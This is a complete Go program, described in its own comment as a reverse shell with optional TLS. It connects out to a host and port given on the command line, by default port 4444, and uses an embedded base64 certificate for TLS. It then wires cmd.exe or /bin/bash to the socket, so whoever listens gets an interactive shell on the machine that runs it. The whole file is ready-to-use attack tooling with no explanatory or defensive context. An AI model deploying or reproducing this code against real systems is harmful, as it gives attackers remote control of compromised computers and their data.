// simple reverse shell supports TLS comms
package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
)

const CertB64 = "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURPekNDQWlNQ0ZDbDhIbGs1eWI2Sy9MalhSdHo3aDRiWEg1b3RNQTBHQ1NxR1NJYjNEUUVCQ3dVQU1Gb3gKQ3pBSkJnTlZCQVlUQWtGVk1STXdFUVlEVlFRSURBcFRiMjFsTFZOMFlYUmxNU0V3SHdZRFZRUUtEQmhKYm5SbApjbTVsZENCWGFXUm5hWFJ6SUZCMGVTQk1kR1F4RXpBUkJnTlZCQU1NQ21GamJXVXViRzlqWVd3d0hoY05Nakl4Ck1qSTNNVFl6TnpNMFdoY05Nak14TWpJM01UWXpOek0wV2pCYU1Rc3dDUVlEVlFRR0V3SkJWVEVUTUJFR0ExVUUKQ0F3S1UyOXRaUzFUZEdGMFpURWhNQjhHQTFVRUNnd1lTVzUwWlhKdVpYUWdWMmxrWjJsMGN5QlFkSGtnVEhSawpNUk13RVFZRFZRUUREQXBoWTIxbExteHZZMkZzTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCCkNnS0NBUUVBa0UvRzJGanlDTS9qYlptaUI1dTdBWXNMOHdzcEhiRGcvd2hUSEs1WmNEb2MrRW9Rcm1xQ2lEaGYKWlorMDlEdmUvU294MkRaRWFuUkJoQm9Ydk5oTGpaMFdtY1hjbTRnNmJSL1dRUzFoaHZwQWJwRElTaEpwNFhaUgoxMzRoSVI2eE9UYk5QRTk2cVU2K3dycHVHUFRudVNlMHJLUWJuY0dXZ01UZ3lwWnJ2MUFYV0dJRnVRS2MzNW1QCjZMWFlYZGorNzdod1VJSEloSlJtNE96Q0VkZU8rSHFyNzdEN1prYXFqaTRucXJRZklRMTd0QVhXS2Y0Ty83anQKUEFLeExQMy9xYzlqYVIvUndRVlRhVFNuR2tlUXp2T0x2L1lNL2NrTjRMWm56QlNtc0J4bVUrY2dqRFg3YXpsRAp4eVlQcjl2eUYwMFV3bWxKM283WnhqcG9KV2dhOHdJREFRQUJNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUJBUUJzClNaYzkwU3FER015U21DTk5HU0Y0MlMzTlZmU2RzNnJuelllMVpoOCt3MnZ6T1dNWXVzTUpxMGNXeDFUM2UzdzEKMUovdGJtQjltRG1VYnl1NTZ1MG8xalJLTjdhSjJLRUdjL1FFcmcrNDlnSXlZblNUQjNzd3k5ZXFuSmwwNFZudAo3OG5DeEhjWFlueFQrWk9QQytnaUVoOGdOendKeTJFRDB4TkhURklTalZHV3pLaENvN0pNTjR5YTJ0REEzOGx4CjlTQkxNbEpMaEJ2ZVNCem5pajBmdVkxNG40d1JEWGo0OFdRMEhnd1lIdjdEMzJRa2wxY2NzNE0xb3c1WmlWYzQKbTVpM1EwZWJpRU9aSmJyWjl1LzBXcUhzaFdNLzd6ZHhqcktJdThONlk0c0FnQmdMUHlVeUFSQWxaZHRkeThZYgorKzV3NDIrOEJYdVo5WjI4QkJrSwotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg=="

func usage() {
	fmt.Fprintf(os.Stderr, "usage: %v [-p|-port] <host>\n", os.Args[0])
	os.Exit(1)
}

func main() {
	var (
		cmd    string
		host   string
		port   int
		useTLS bool
		shell  *exec.Cmd
	)
	flag.IntVar(&port, "port", 4444, "Port to connect to ")
	flag.IntVar(&port, "p", 4444, "Port to connect to ")
	flag.BoolVar(&useTLS, "tls", false, "Connect over TLS")
	flag.Parse()

	if len(flag.Args()) < 1 {
		usage()
	}

	if runtime.GOOS == "windows" {
		cmd = "cmd.exe"
	} else {
		cmd = "/bin/bash"
	}

	host = flag.Arg(0)

	if useTLS {
		roots := x509.NewCertPool()
		cert, err := base64.StdEncoding.DecodeString(CertB64)
		if err != nil {
			fmt.Fprintln(os.Stderr, err.Error())
			return
		}
		ok := roots.AppendCertsFromPEM(cert)
		if !ok {
			fmt.Fprintln(os.Stderr, "Could not add cert to pool")
			return
		}
		config := &tls.Config{RootCAs: roots}
		conn, err := tls.Dial("tcp", fmt.Sprintf("%v:%v", host, port), config)
		if err != nil {
			fmt.Fprintln(os.Stderr, err.Error())
			return
		}
		defer conn.Close()
		shell = exec.Command(cmd)
		if err != nil {
			fmt.Fprintln(os.Stderr, err.Error())
			return
		}
		shell.Stderr = conn
		shell.Stdin = conn
		shell.Stdout = conn
		shell.Run()
	} else {
		conn, err := net.Dial("tcp", fmt.Sprintf("%v:%v", host, port))
		if err != nil {
			fmt.Fprintln(os.Stderr, err.Error())
			return
		}
		defer conn.Close()
		shell = exec.Command(cmd)
		if err != nil {
			fmt.Fprintln(os.Stderr, err.Error())
			return
		}
		shell.Stderr = conn
		shell.Stdin = conn
		shell.Stdout = conn
		err = shell.Run()
		if err != nil {
			fmt.Fprintln(os.Stderr, err.Error())
			return
		}
	}

}
